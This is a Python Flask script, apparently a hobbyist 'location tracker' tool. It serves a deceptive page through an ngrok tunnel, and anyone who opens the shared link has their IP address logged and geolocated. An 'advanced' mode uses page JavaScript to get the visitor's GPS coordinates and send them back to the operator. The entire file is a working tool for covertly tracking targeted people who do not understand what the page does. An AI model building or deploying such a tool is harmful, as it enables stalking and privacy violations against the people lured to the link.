import requests
import datetime
import os
import time
import subprocess
from flask import Flask, request, render_template_string
from threading import Thread

app = Flask(__name__)

HTML_BASIC = """
<!doctype html>
<html><head><title>Welcome</title></head>
<body><h2>Thanks for visiting</h2><p>Your IP has been logged.</p></body>
</html>
"""

HTML_IMMEDIATE = """
<!DOCTYPE html>
<html>
<head><title>Accurate Location Tracker</title></head>
<body>
<h2>Thanks for visiting!</h2>
<p>Your IP has been logged.</p>
<script>
fetch("/log_ip", {method: "POST"}).catch(() => {});
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(function(position) {
    fetch("/submit_location", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy
      })
    }).catch(() => {});
  });
}
</script>
</body>
</html>
"""

def banner():
    print("\033[92m" + """
╔════════════════════════════════════════════════╗
║              Made by Mohimanul-TVM             ║
╚════════════════════════════════════════════════╝
""" + "\033[0m")

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = res.json()
        if data["status"] == "success":
            return {
                "IP": ip,
                "City": data.get("city"),
                "Region": data.get("regionName"),
                "Country": data.get("country"),
                "Latitude": data.get("lat"),
                "Longitude": data.get("lon"),
                "ISP": data.get("isp"),
                "Map": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}",
                "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
    except Exception as e:
        return {"IP": ip, "Error": str(e)}
    return {"IP": ip, "Error": "Unknown error"}

@app.route('/')
def index():
    return render_template_string(HTML_BASIC)

@app.route('/log_ip', methods=["POST"])
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = get_location(ip)
    print("\n--- Immediate IP Captured ---")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("----------------------------\n")
    return "IP logged"

@app.route('/submit_location', methods=["POST"])
def submit_location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")
    result = {
        "method": "GPS",
        "Latitude": lat,
        "Longitude": lon,
        "Accuracy (m)": accuracy,
        "Map": f"https://www.google.com/maps?q={lat},{lon}",
        "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    print("\n--- Accurate Location Captured (GPS) ---")
    for k, v in result.items():
        print(f"{k}: {v}")
    print("----------------------------------------\n")
    return "Location received!"

@app.route('/immediate')
def immediate():
    return render_template_string(HTML_IMMEDIATE)

def download_ngrok():
    if not os.path.isfile("ngrok"):
        print("[•] Downloading ngrok...")
        os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
        os.system("unzip ngrok.zip && rm ngrok.zip")
        os.system("chmod +x ngrok")

def start_ngrok(subdomain=""):
    token = input("Enter your Ngrok Authtoken: ").strip()
    if not os.path.isfile("ngrok"):
        download_ngrok()
    os.system(f"./ngrok authtoken {token}")
    cmd = ["./ngrok", "http", "5000"]
    if subdomain:
        cmd.extend(["--region=us", f"--subdomain={subdomain}"])
    print("[•] Starting Ngrok tunnel...")
    ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    for _ in range(10):
        try:
            res = requests.get("http://localhost:4040/api/tunnels").json()
            tunnels = res.get("tunnels", [])
            if tunnels:
                public_url = tunnels[0]["public_url"]
                print(f"[✓] Ngrok tunnel started: {public_url}")
                return ngrok_process, public_url
        except:
            pass
        time.sleep(2)
    print("[✗] Failed to get ngrok URL after 10 seconds.")
    ngrok_process.terminate()
    return None, None

def run_flask():
    app.run(host="0.0.0.0", port=5000)

def ip_lookup():
    ip = input("Enter target IP address: ").strip()
    data = get_location(ip)
    print("\n--- IP Info ---")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("----------------")

def generate_link():
    subdomain = input("Enter desired ngrok subdomain (or leave blank for random): ").strip()
    ngrok_process, public_url = start_ngrok(subdomain)
    if not public_url:
        return
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    print("[✓] Share this link to capture IP: " + public_url)
    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")
        ngrok_process.terminate()
        flask_thread.join()

def immediate_ip_gps_option():
    subdomain = input("Enter desired ngrok subdomain (or leave blank for random): ").strip()
    ngrok_process, public_url = start_ngrok(subdomain)
    if not public_url:
        return
    full_url = public_url + "/immediate"
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    print("[✓] Share this link for IP + GPS tracking: " + full_url)
    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")
        ngrok_process.terminate()
        flask_thread.join()

def menu():
    banner()
    while True:
        print("\n[1] Track location using IP")
        print("[2] Generate link & capture visitor IP (basic)")
        print("[3] Generate link & capture IP + GPS (advanced)")
        print("[0] Exit")
        choice = input("Select an option: ").strip()
        if choice == '1':
            ip_lookup()
        elif choice == '2':
            generate_link()
        elif choice == '3':
            immediate_ip_gps_option()
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid option.")

if __name__ == '__main__':
    menu()
